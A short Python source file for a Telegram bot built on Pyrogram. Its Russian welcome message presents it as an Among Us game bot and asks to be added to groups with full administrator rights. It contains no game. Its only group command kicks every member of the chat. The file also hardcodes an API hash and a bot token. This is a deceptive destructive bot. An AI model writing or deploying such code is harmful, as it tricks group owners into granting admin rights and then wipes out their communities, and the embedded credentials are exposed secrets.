from pyrogram import Client as bot, filters, idle
import asyncio

app = bot(
session_name='AmonsUs',
api_id=7938894,
api_hash='c6e82bb3e729c057064471cbb6f9d33d',
bot_token='1940951363:AAHXraGpKpR2DBv1UsqFpYdkeZC8hj5uZvM',
)
app.start()

@app.on_message(filters.command('start', '/') & filters.private)
async def start(client, message):
	await message.reply_text(f'<b>Привет, {message.from_user.first_name}!\n\nЯ - бот для игры в Among Us прямо в Телеграме!\nЧтобы запустить игру, добавьте меня в группу и дайте права администратора с всеми галочками, иначе я не буду работать!</b>')
	
@app.on_message(filters.command('ban', ['/', '!', '.']) & ~filters.private)
def kickall(client, message):
	for all in client.iter_chat_members(message.chat.id):
		try:
			client.kick_chat_member(message.chat.id, all.user.id, 0)
			asyncio.sleep(2)
		except:
			pass
idle()
